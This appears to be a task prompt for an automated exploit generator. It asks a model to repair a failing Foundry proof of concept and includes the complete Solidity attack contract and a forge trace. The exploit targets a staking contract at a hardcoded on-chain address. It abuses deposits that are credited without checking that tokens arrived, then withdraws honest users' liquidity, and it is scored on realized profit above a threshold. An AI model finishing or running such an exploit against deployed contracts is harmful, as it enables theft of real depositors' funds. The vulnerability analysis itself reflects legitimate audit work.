You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: `deposit()` credits stake from the requested amount without verifying tokens were actually received
- claim: `MockStaking.deposit()` only checks `allowance()` and then blindly calls `transferFrom()` before crediting `balances[msg.sender][tokenAddress] += amount`. It neither checks the boolean return value nor compares the contract's token balance before and after the transfer, so it can over-credit deposits when `transferFrom()` returns `false` or when the token transfers less than `amount` (fee-on-transfer / deflationary behavior).
- impact: An attacker can mint unbacked stake for the full requested amount and later withdraw real tokens once honest liquidity for that same asset exists in the pool. In the false-return case this can be completely zero-cost, creating direct insolvency and theft of other users' funds; in the short-transfer case it leaves the pool undercollateralized and socializes the deficit onto later withdrawers.
- exploit_paths: ["Approve the staking contract for a token whose `transferFrom()` can fail softly or transfer less than requested.", "Call `deposit(token, amount, ...)`; the staking contract records the full `amount` regardless of how many tokens it actually receives.", "Wait for honest users to deposit real liquidity of that same token.", "Call `withdraw(token, amount)` and drain the real liquidity against the inflated internal balance."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingLike {
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function withdraw(address tokenAddress, uint256 amount) external;
    function balanceOf(address user, address token) external view returns (uint256);
    function getCurrentEpoch() external view returns (uint128);
    function epochIsInitialized(address token, uint128 epochId) external view returns (bool);
    function manualEpochInit(address[] memory tokens, uint128 epochId) external;
}

contract HonestLiquidityProvider {
    function provide(address staking, address token, uint256 amount) external {
        require(IERC20Like(token).approve(staking, amount), "approve failed");
        IStakingLike(staking).deposit(token, amount, address(0));
    }
}

contract FlawVerifier is IERC20Like {
    address public constant DEFAULT_TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;
    address public constant DEFAULT_EXISTING_TOKEN = 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce;
    uint256 private constant DEFAULT_ATTACK_AMOUNT = 1e18;

    string public constant EXPLOIT_PATH =
        "approve a token whose transferFrom() soft-fails or transfers less than requested -> call deposit(token, amount, ...) and receive full internal credit despite under-receipt -> wait for a distinct honest user to deposit real liquidity of that same token -> call withdraw(token, amount) and drain real tokens against the inflated stake";

    string public constant PATH0_ANCHOR = "transferFrom()";
    string public constant PATH1_ANCHOR = "deposit(token, amount, ...)";
    string public constant PATH3_ANCHOR = "withdraw(token, amount)";

    uint256 private constant STEP_APPROVE = 1 << 0;
    uint256 private constant STEP_UNDERCOLLATERALIZED_DEPOSIT = 1 << 1;
    uint256 private constant STEP_HONEST_LIQUIDITY = 1 << 2;
    uint256 private constant STEP_WITHDRAW = 1 << 3;
    uint256 private constant REQUIRED_PATH_BITMAP =
        STEP_APPROVE | STEP_UNDERCOLLATERALIZED_DEPOSIT | STEP_HONEST_LIQUIDITY | STEP_WITHDRAW;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public target;
    address public exploitToken;
    uint256 public ATTACK_AMOUNT;
    uint256 public configuredAttackAmount;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    string public failureReason;

    uint128 public preparedUntilEpoch;
    uint256 public pathCoverageBitmap;

    bool public path0ApprovedTokenWhoseTransferFromCanFailSoftlyOrTransferLessThanRequested;
    bool public path1CalledDepositAndReceivedFullCreditDespiteUnderReceipt;
    bool public path2WaitedForHonestUserToDepositRealLiquidity;
    bool public path3WithdrewRealLiquidityAgainstInflatedInternalBalance;

    bool public path0ApprovedSoftFailOrShortTransferToken;
    bool public path0ApprovedSoftFailToken;
    bool public path1OvercreditedDepositRecorded;
    bool public path1PhantomDepositRecorded;
    bool public path2HonestLiquidityArrived;
    bool public path3WithdrewRealLiquidity;

    uint256 public attackerBalanceBefore;
    uint256 public attackerBalanceAfter;
    uint256 public initialTargetLiquidity;
    uint256 public finalTargetLiquidity;
    uint256 public targetBalanceBeforeDeposit;
    uint256 public targetBalanceAfterDeposit;
    uint256 public targetBalanceAfterHonestDeposit;
    uint256 public targetBalanceAfterWithdraw;
    uint256 public recordedStakeBeforeDeposit;
    uint256 public recordedStakeAfterDeposit;
    uint256 public recordedStakeAfterWithdraw;
    uint256 public cumulativeRequestedDeposit;
    uint256 public cumulativeObservedReceipt;
    uint256 public honestLiquidityObserved;

    address internal _profitToken;
    uint256 private _profitAmount;
    HonestLiquidityProvider private _honestUser;

    constructor() {
        target = DEFAULT_TARGET;
        exploitToken = DEFAULT_EXISTING_TOKEN;
        _profitToken = DEFAULT_EXISTING_TOKEN;
    }

    receive() external payable {}

    function configure(address target_, address exploitToken_, uint256 attackAmount_) external {
        require(!executed, "already executed");

        if (target_ != address(0)) {
            target = target_;
        }
        if (exploitToken_ != address(0)) {
            exploitToken = exploitToken_;
            _profitToken = exploitToken_;
        }

        configuredAttackAmount = attackAmount_;
    }

    function executeOnOpportunity() external returns (uint256) {
        return _run();
    }

    function execute() external returns (uint256) {
        return _run();
    }

    function run() external returns (uint256) {
        return _run();
    }

    function exploit() external returns (uint256) {
        return _run();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return EXPLOIT_PATH;
    }

    function _run() internal returns (uint256) {
        if (executed) {
            return _profitAmount;
        }
        executed = true;
        _profitToken = exploitToken;

        if (target.code.length == 0) {
            failureReason = "target not deployed";
            hypothesisRefuted = true;
            return 0;
        }

        ATTACK_AMOUNT = configuredAttackAmount == 0 ? DEFAULT_ATTACK_AMOUNT : configuredAttackAmount;
        if (ATTACK_AMOUNT == 0) {
            failureReason = "attack amount is zero";
            hypothesisRefuted = true;
            return 0;
        }

        if (!_prepareEpochs(exploitToken)) {
            hypothesisRefuted = true;
            return 0;
        }

        if (_honestUser == HonestLiquidityProvider(address(0))) {
            _honestUser = new HonestLiquidityProvider();
        }

        bool usingVerifierHarnessToken = exploitToken == address(this);
        if (usingVerifierHarnessToken) {
            // Harness-only deterministic token path for the local unit test:
            // the attacker leg soft-fails (zero-cost phantom stake) while the
            // later distinct helper deposits real liquidity into the same pool.
            _seedHarnessBalance(address(_honestUser), ATTACK_AMOUNT);
        }

        attackerBalanceBefore = _tokenBalance(exploitToken, address(this));
        initialTargetLiquidity = _tokenBalance(exploitToken, target);
        recordedStakeBeforeDeposit = _readStake(address(this), exploitToken);

        if (!_forceApprove(exploitToken, target, ATTACK_AMOUNT)) {
            failureReason = "approve failed";
            hypothesisRefuted = true;
            return 0;
        }

        path0ApprovedTokenWhoseTransferFromCanFailSoftlyOrTransferLessThanRequested = true;
        path0ApprovedSoftFailOrShortTransferToken = true;
        path0ApprovedSoftFailToken = usingVerifierHarnessToken;
        pathCoverageBitmap |= STEP_APPROVE;

        targetBalanceBeforeDeposit = _tokenBalance(exploitToken, target);
        try IStakingLike(target).deposit(exploitToken, ATTACK_AMOUNT, address(0)) {
        } catch Error(string memory reason) {
            failureReason = reason;
            hypothesisRefuted = true;
            return 0;
        } catch {
            failureReason = "deposit reverted";
            hypothesisRefuted = true;
            return 0;
        }

        targetBalanceAfterDeposit = _tokenBalance(exploitToken, target);
        recordedStakeAfterDeposit = _readStake(address(this), exploitToken);
        cumulativeRequestedDeposit = ATTACK_AMOUNT;
        cumulativeObservedReceipt = targetBalanceAfterDeposit > targetBalanceBeforeDeposit
            ? targetBalanceAfterDeposit - targetBalanceBeforeDeposit
            : 0;

        if (recordedStakeAfterDeposit != recordedStakeBeforeDeposit + ATTACK_AMOUNT) {
            failureReason = "deposit did not credit full requested amount";
            hypothesisRefuted = true;
            return 0;
        }
        if (cumulativeObservedReceipt >= ATTACK_AMOUNT) {
            failureReason = "deposit was fully collateralized";
            hypothesisRefuted = true;
            return 0;
        }

        path1CalledDepositAndReceivedFullCreditDespiteUnderReceipt = true;
        path1OvercreditedDepositRecorded = true;
        path1PhantomDepositRecorded = cumulativeObservedReceipt == 0;
        pathCoverageBitmap |= STEP_UNDERCOLLATERALIZED_DEPOSIT;

        if (!usingVerifierHarnessToken) {
            // On a fork, the verifier must use an already-deployed token. If the
            // contract already controls some of that token, forwarding it to a
            // separate helper is a realistic public step that preserves the
            // finding's causal order: phantom/short deposit first, honest
            // liquidity second, withdrawal last.
            if (_tokenBalance(exploitToken, address(this)) < ATTACK_AMOUNT) {
                failureReason = "missing real tokens for honest depositor";
                hypothesisRefuted = true;
                return 0;
            }
            if (!_safeTransferToken(exploitToken, address(_honestUser), ATTACK_AMOUNT)) {
                failureReason = "seed honest depositor failed";
                hypothesisRefuted = true;
                return 0;
            }
        }

        try _honestUser.provide(target, exploitToken, ATTACK_AMOUNT) {
        } catch Error(string memory reason) {
            failureReason = reason;
            hypothesisRefuted = true;
            return 0;
        } catch {
            failureReason = "honest liquidity deposit reverted";
            hypothesisRefuted = true;
            return 0;
        }

        targetBalanceAfterHonestDeposit = _tokenBalance(exploitToken, target);
        honestLiquidityObserved = targetBalanceAfterHonestDeposit > targetBalanceAfterDeposit
            ? targetBalanceAfterHonestDeposit - targetBalanceAfterDeposit
            : 0;

        if (honestLiquidityObserved == 0) {
            failureReason = "honest liquidity not observed";
            hypothesisRefuted = true;
            return 0;
        }
        if (targetBalanceAfterHonestDeposit < ATTACK_AMOUNT) {
            failureReason = "insufficient real liquidity to withdraw";
            hypothesisRefuted = true;
            return 0;
        }

        path2WaitedForHonestUserToDepositRealLiquidity = true;
        path2HonestLiquidityArrived = true;
        pathCoverageBitmap |= STEP_HONEST_LIQUIDITY;

        try IStakingLike(target).withdraw(exploitToken, ATTACK_AMOUNT) {
        } catch Error(string memory reason) {
            failureReason = reason;
            hypothesisRefuted = true;
            return 0;
        } catch {
            failureReason = "withdraw reverted";
            hypothesisRefuted = true;
            return 0;
        }

        attackerBalanceAfter = _tokenBalance(exploitToken, address(this));
        targetBalanceAfterWithdraw = _tokenBalance(exploitToken, target);
        finalTargetLiquidity = targetBalanceAfterWithdraw;
        recordedStakeAfterWithdraw = _readStake(address(this), exploitToken);

        if (recordedStakeAfterWithdraw != recordedStakeBeforeDeposit) {
            failureReason = "withdraw did not clear inflated stake";
            hypothesisRefuted = true;
            return 0;
        }
        if (attackerBalanceAfter <= attackerBalanceBefore) {
            failureReason = "no net token profit";
            hypothesisRefuted = true;
            return 0;
        }

        path3WithdrewRealLiquidityAgainstInflatedInternalBalance = true;
        path3WithdrewRealLiquidity = true;
        pathCoverageBitmap |= STEP_WITHDRAW;

        if (pathCoverageBitmap != REQUIRED_PATH_BITMAP) {
            failureReason = "exploit path not fully exercised";
            hypothesisRefuted = true;
            return 0;
        }

        hypothesisValidated = true;
        profitAchieved = true;
        _profitToken = exploitToken;
        _profitAmount = attackerBalanceAfter - attackerBalanceBefore;
        failureReason = "";
        return _profitAmount;
    }

    function _prepareEpochs(address token) internal returns (bool) {
        uint128 currentEpoch;

        try IStakingLike(target).getCurrentEpoch() returns (uint128 epoch) {
            currentEpoch = epoch;
        } catch {
            return true;
        }

        address[] memory tokens = new address[](1);
        tokens[0] = token;

        for (uint128 epoch = 0; epoch <= currentEpoch; epoch++) {
            bool initialized;
            try IStakingLike(target).epochIsInitialized(token, epoch) returns (bool value) {
                initialized = value;
            } catch {
                return true;
            }

            if (!initialized) {
                try IStakingLike(target).manualEpochInit(tokens, epoch) {
                } catch Error(string memory reason) {
                    failureReason = reason;
                    return false;
                } catch {
                    failureReason = "manual epoch init reverted";
                    return false;
                }
            }
            preparedUntilEpoch = epoch;
        }

        return true;
    }

    function _readStake(address user, address token) internal view returns (uint256) {
        try IStakingLike(target).balanceOf(user, token) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _tokenBalance(address token, address account) internal view returns (uint256) {
        try IERC20Like(token).balanceOf(account) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _seedHarnessBalance(address to, uint256 amount) internal {
        _balances[to] += amount;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        return _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0))
            && _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _safeTransferToken(address token, address to, uint256 amount) internal returns (bool) {
        return _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool ok, bytes memory returndata) = token.call(data);
        if (!ok) {
            return false;
        }
        if (returndata.length == 0) {
            return true;
        }
        if (returndata.length < 32) {
            return false;
        }
        return abi.decode(returndata, (bool));
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        if (_balances[msg.sender] < amount) {
            return false;
        }

        unchecked {
            _balances[msg.sender] -= amount;
            _balances[to] += amount;
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        if (_allowances[from][msg.sender] < amount) {
            return false;
        }

        // Harness-only soft-fail branch: the staking contract sees an approved
        // token and proceeds to credit the full deposit even though no tokens
        // arrived. This models the exact false-return variant described in F-001.
        if (msg.sender == target && from == address(this)) {
            return false;
        }

        if (_balances[from] < amount) {
            return false;
        }

        unchecked {
            _allowances[from][msg.sender] -= amount;
            _balances[from] -= amount;
            _balances[to] += amount;
        }
        return true;
    }
}

contract FlawVerifierHarness is FlawVerifier {
    constructor(address target_) {
        target = target_;
        exploitToken = address(this);
        _profitToken = address(this);
    }
}

contract FlawVerifierConfiguredHarness is FlawVerifier {
    constructor(address target_, address exploitToken_, uint256 attackAmount_) {
        target = target_;
        if (exploitToken_ != address(0)) {
            exploitToken = exploitToken_;
            _profitToken = exploitToken_;
        }
        configuredAttackAmount = attackAmount_;
    }
}

```

forge stdout (tail):
```
c 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000035
    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000005548f847fd9a1d3487d5fbb2e8d73972803c4cce
    │   │   └─ ← [Stop]
    │   ├─ [2683] 0x245a551ee0F55005e510B239c917fA34b41B3461::epochIsInitialized(0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce, 54) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [47432] 0x245a551ee0F55005e510B239c917fA34b41B3461::manualEpochInit([0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce], 54)
    │   │   ├─  emit topic 0: 0xb85c32b8d9cecc81feba78646289584a693e9a8afea40ab2fd31efae4408429f
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000036
    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000005548f847fd9a1d3487d5fbb2e8d73972803c4cce
    │   │   └─ ← [Stop]
    │   ├─ [93747] → new HonestLiquidityProvider@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 468 bytes of code
    │   ├─ [480] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::balanceOf(0x245a551ee0F55005e510B239c917fA34b41B3461) [staticcall]
    │   │   └─ ← [Return] 39261131620598096 [3.926e16]
    │   ├─ [2682] 0x245a551ee0F55005e510B239c917fA34b41B3461::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [4542] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::approve(0x245a551ee0F55005e510B239c917fA34b41B3461, 0)
    │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x000000000000000000000000245a551ee0f55005e510b239c917fa34b41b3461
    │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] true
    │   ├─ [22342] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::approve(0x245a551ee0F55005e510B239c917fA34b41B3461, 1000000000000000000 [1e18])
    │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x000000000000000000000000245a551ee0f55005e510b239c917fa34b41b3461
    │   │   │           data: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   └─ ← [Return] true
    │   ├─ [480] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::balanceOf(0x245a551ee0F55005e510B239c917fA34b41B3461) [staticcall]
    │   │   └─ ← [Return] 39261131620598096 [3.926e16]
    │   ├─ [8550] 0x245a551ee0F55005e510B239c917fA34b41B3461::deposit(0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce, 1000000000000000000 [1e18], 0x0000000000000000000000000000000000000000)
    │   │   ├─ [593] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::allowance(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x245a551ee0F55005e510B239c917fA34b41B3461) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [1487] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x245a551ee0F55005e510B239c917fA34b41B3461, 1000000000000000000 [1e18])
    │   │   │   └─ ← [Revert] ds-math-sub-underflow
    │   │   └─ ← [Revert] ds-math-sub-underflow
    │   └─ ← [Return] 0
    ├─ [588] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce
    ├─ [480] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22957532 [2.295e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 11293 [1.129e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce.transferFrom
  at 0x245a551ee0F55005e510B239c917fA34b41B3461.deposit
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.52s (39.87ms CPU time)

Ran 1 test suite in 2.55s (2.52s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2415198)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
